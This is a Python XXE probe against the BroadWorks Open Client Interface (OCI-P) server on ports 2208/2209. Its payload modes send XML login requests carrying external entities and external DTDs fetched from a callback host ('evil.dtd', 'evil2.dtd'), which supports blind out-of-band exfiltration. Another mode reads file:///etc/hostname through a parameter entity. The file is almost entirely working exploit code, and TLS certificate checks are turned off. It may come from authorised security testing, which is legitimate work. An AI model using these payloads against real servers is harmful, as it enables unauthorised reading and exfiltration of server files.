#!/usr/bin/env python3
"""
Raw OCI-P (BroadWorks Open Client Interface) probe.

Target port 2208/2209 is NOT a BCCT endpoint: the OCS uses
com.broadsoft.openclientserver.io.ClientTcpServer + TcpSimpleXmlReader, i.e. a
plain TCP stream carrying XML documents whose root element is
<BroadsoftDocument ... protocol="OCI">.

Usage:
  oci_probe.py <host> <port> <mode> [tls] [cbhost] [cbport]
Modes:
  plain  - baseline well-formed OCI document (unauthenticated LoginRequest)
  gen    - external GENERAL entity reference (tests external-general-entities)
  par    - external PARAMETER entity in internal subset (tests external-parameter-entities)
  dtd    - external DTD subset via <!DOCTYPE ... SYSTEM "...">
  dtdx   - external DTD hosted on the callback listener (blind exfil DTD)
  file   - parameter entity pointing at file:///etc/hostname (error-based)
"""
import socket
import ssl
import sys
import time

XML_DECL = '<?xml version="1.0" encoding="ISO-8859-1"?>'
BODY = (
    '<BroadsoftDocument protocol="OCI" xmlns="C">'
    '<sessionId>probesess0001</sessionId>'
    '<command xsi:type="LoginRequest14sp4" '
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    '<userId>probeuser</userId><signedPassword>probesig</signedPassword>'
    '</command></BroadsoftDocument>'
)


def payload(mode, cbhost, cbport):
    url = "http://%s:%d/" % (cbhost, cbport)
    if mode == "plain":
        return XML_DECL + BODY
    if mode == "gen":
        return (XML_DECL +
                '<!DOCTYPE BroadsoftDocument [<!ENTITY g SYSTEM "%sGEN_ENTITY">]>' % url +
                '<BroadsoftDocument protocol="OCI" xmlns="C">'
                '<sessionId>&g;</sessionId>'
                '<command xsi:type="LoginRequest14sp4" '
                'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
                '<userId>probeuser</userId><signedPassword>probesig</signedPassword>'
                '</command></BroadsoftDocument>')
    if mode == "par":
        return (XML_DECL +
                '<!DOCTYPE BroadsoftDocument [<!ENTITY %% p SYSTEM "%sPARAM_ENTITY">%%p;]>' % url +
                BODY).replace("%%", "%")
    if mode == "dtd":
        return XML_DECL + '<!DOCTYPE BroadsoftDocument SYSTEM "%sEXT_DTD">' % url + BODY
    if mode == "dtdx":
        return (XML_DECL +
                '<!DOCTYPE BroadsoftDocument SYSTEM "%sevil.dtd">' % url + BODY)
    if mode == "band":
        # external DTD declares an internal general entity whose value is read
        # from a local file; the value is placed in an element the server echoes
        return (XML_DECL +
                '<!DOCTYPE BroadsoftDocument SYSTEM "%sevil2.dtd">' % url +
                '<BroadsoftDocument protocol="OCI" xmlns="C">'
                '<sessionId>&leak;</sessionId>'
                '<command xsi:type="LoginRequest14sp4" '
                'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
                '<userId>probeuser</userId><signedPassword>probesig</signedPassword>'
                '</command></BroadsoftDocument>')
    if mode == "bandp":
        return (XML_DECL +
                '<!DOCTYPE BroadsoftDocument SYSTEM "%sevil3.dtd">' % url +
                '<BroadsoftDocument protocol="OCI" xmlns="C">'
                '<sessionId>&leak;</sessionId>'
                '<command xsi:type="LoginRequest14sp4" '
                'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
                '<userId>probeuser</userId><signedPassword>probesig</signedPassword>'
                '</command></BroadsoftDocument>')
    if mode == "file":
        return (XML_DECL +
                '<!DOCTYPE BroadsoftDocument [<!ENTITY %% p SYSTEM "file:///etc/hostname">%%p;]>' +
                BODY).replace("%%", "%")
    raise SystemExit("unknown mode " + mode)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.188.x"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2208
    mode = sys.argv[3] if len(sys.argv) > 3 else "plain"
    tls = len(sys.argv) > 4 and sys.argv[4].lower() in ("1", "true", "tls", "yes")
    cbhost = sys.argv[5] if len(sys.argv) > 5 else "192.168.188.x"
    cbport = int(sys.argv[6]) if len(sys.argv) > 6 else 18080

    data = payload(mode, cbhost, cbport).encode("iso-8859-1")
    print("=== mode=%s target=%s:%d tls=%s len=%d ===" % (mode, host, port, tls, len(data)))

    s = socket.create_connection((host, port), timeout=8)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(12)
    s.sendall(data)
    chunks = []
    try:
        while True:
            b = s.recv(65536)
            if not b:
                break
            chunks.append(b)
            if sum(len(c) for c in chunks) > 200000:
                break
    except socket.timeout:
        pass
    except Exception as e:
        print("[recv-error] %r" % (e,))
    resp = b"".join(chunks)
    print("[bytes] %d" % len(resp))
    print("[response-begin]")
    print(resp.decode("iso-8859-1", "replace"))
    print("[response-end]")
    try:
        s.close()
    except Exception:
        pass


if __name__ == "__main__":
    main()
